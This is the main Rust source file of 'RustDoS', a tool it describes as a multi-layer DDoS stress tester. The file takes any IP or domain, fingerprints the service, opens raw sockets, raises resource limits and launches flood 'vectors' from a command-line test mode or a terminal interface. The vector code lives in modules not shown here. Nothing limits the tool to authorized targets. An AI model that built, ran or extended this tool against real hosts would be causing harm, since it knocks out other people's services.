//! RustDoS - multi-layer (L1-L7) DDoS stress tester.

mod app;
mod attack;
mod net;
mod stats;
mod target;
mod ui;
mod vectors;

use std::io::{self, Stdout};
use std::sync::Arc;
use std::time::Duration;

use crossterm::event::{self, Event, KeyEvent};
use crossterm::execute;
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use ratatui::backend::CrosstermBackend;
use ratatui::Terminal;
use tokio::sync::mpsc;

use app::App;
use attack::Ctx;
use net::raw::{self, RawSock};
use stats::Stats;

type Term = Terminal<CrosstermBackend<Stdout>>;

fn setup() -> io::Result<Term> {
    enable_raw_mode()?;
    let mut out = io::stdout();
    execute!(out, EnterAlternateScreen)?;
    let mut t = Terminal::new(CrosstermBackend::new(out))?;
    t.hide_cursor()?;
    Ok(t)
}

fn restore(t: &mut Term) {
    let _ = disable_raw_mode();
    let _ = execute!(t.backend_mut(), LeaveAlternateScreen);
    let _ = t.show_cursor();
}

fn raise_limits() {
    unsafe {
        let mut rl: libc::rlimit = std::mem::zeroed();
        if libc::getrlimit(libc::RLIMIT_NOFILE, &mut rl) == 0 {
            rl.rlim_cur = rl.rlim_max;
            libc::setrlimit(libc::RLIMIT_NOFILE, &rl);
        }
    }
}

#[tokio::main(worker_threads = 8)]
async fn main() -> io::Result<()> {
    raise_limits();
    let args: Vec<String> = std::env::args().collect();
    match args.get(1).map(|s| s.as_str()) {
        Some("--list") => {
            for s in vectors::ALL.iter() {
                println!("{:<5} {:<13} {}", s.layer, s.name, s.desc);
            }
            return Ok(());
        }
        Some("--test") | Some("--selftest") => return selftest(&args).await,
        _ => {}
    }
    tui().await
}

async fn selftest(args: &[String]) -> io::Result<()> {
    let Some(input) = args.get(2) else {
        eprintln!("usage: rustdos --test <ip|domain> [port] [seconds]");
        return Ok(());
    };
    let port = args.get(3).cloned().unwrap_or_default();
    let secs: u64 = args.get(4).and_then(|s| s.parse().ok()).unwrap_or(5);

    let mut t = match target::Target::parse(input, &port) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("{e}");
            return Ok(());
        }
    };
    if let Err(e) = t.resolve() {
        eprintln!("{e}");
        return Ok(());
    }
    if let Err(e) = target::fingerprint(&mut t) {
        eprintln!("{e}");
        return Ok(());
    }
    println!(
        "target {} -> {:?} service={} port={:?} tls={}",
        t.host,
        t.ips,
        t.service.label(),
        t.port,
        t.tls
    );

    let iface = raw::discover().ok();
    let raw = iface.as_ref().and_then(|i| RawSock::open(i).ok()).map(Arc::new);
    println!(
        "iface={:?} raw={}",
        iface.as_ref().map(|i| i.name.clone()),
        raw.is_some()
    );
    let plan = if args.len() > 5 {
        args[5..]
            .iter()
            .filter_map(|n| vectors::ALL.iter().find(|s| s.name == n).map(|s| s.vector))
            .collect::<Vec<_>>()
    } else {
        vectors::plan_for(t.service, t.port, raw.is_some())
    };
    println!("vectors: {:?}", plan.iter().map(|v| v.name()).collect::<Vec<_>>());

    let stats = Arc::new(Stats::new());
    let ctx = Arc::new(Ctx {
        port: t.port.unwrap_or(80),
        target: t,
        iface,
        raw,
        stats: stats.clone(),
        budgets: vectors::ALL
            .iter()
            .map(|s| Arc::new(attack::Budget::new(attack::raw_rate(s.vector))))
            .collect(),
    });
    attack::launch(ctx, plan);
    for i in 1..=secs {
        tokio::time::sleep(Duration::from_secs(1)).await;
        println!(
            "t+{i}s  {} pkts  {}  err {}",
            stats.total_packets(),
            stats::human_bytes(stats.total_bytes()),
            stats.errors()
        );
    }
    stats.stop();
    tokio::time::sleep(Duration::from_millis(300)).await;
    println!("--- per vector ---");
    for (i, p, b) in stats.per_vector() {
        if p > 0 {
            println!("{:<13} {:>10} pkts {:>10}", vectors::ALL[i].name, p, stats::human_bytes(b));
        }
    }
    Ok(())
}

async fn tui() -> io::Result<()> {
    let mut term = setup()?;
    let mut app = App::new();

    if unsafe { libc::geteuid() } != 0 {
        app.note(String::from("not running as root: raw L1-L4 vectors unavailable"));
    }

    let (tx, mut rx) = mpsc::channel::<KeyEvent>(64);
    std::thread::spawn(move || loop {
        match event::read() {
            Ok(Event::Key(k)) => {
                if tx.blocking_send(k).is_err() {
                    break;
                }
            }
            Ok(Event::Resize(_, _)) => {}
            Ok(_) => {}
            Err(_) => break,
        }
    });

    let mut ticker = tokio::time::interval(Duration::from_millis(250));
    let mut result = Ok(());

    loop {
        if let Err(e) = term.draw(|f| ui::draw(f, &app)) {
            result = Err(e);
            break;
        }
        tokio::select! {
            maybe = rx.recv() => {
                match maybe {
                    Some(k) => app.handle_key(k),
                    None => break,
                }
            }
            _ = ticker.tick() => {
                app.poll_scan();
                app.tick();
            }
        }
        if app.quit {
            break;
        }
    }

    if let Some(s) = &app.stats {
        s.stop();
    }
    restore(&mut term);
    result
}
